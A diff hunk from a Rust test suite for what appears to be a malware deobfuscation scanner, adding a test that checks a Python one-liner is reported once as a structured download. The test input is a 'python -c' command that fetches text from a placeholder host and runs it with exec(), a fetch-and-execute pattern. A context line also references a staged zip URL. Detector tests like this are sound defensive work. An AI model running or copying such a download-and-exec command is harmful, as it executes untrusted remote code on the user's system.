@@ -11045,6 +11045,38 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn python_requests_parenthesized_get_import_alias_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            "python -c \"from requests import (\n    post,\n    get as fetch,\n); exec(fetch('https://py.example/requests-paren-import').text)\"",
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/requests-paren-import" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python requests parenthesized get import alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/requests-paren-import")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python requests parenthesized import alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_urllib_urlopen_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
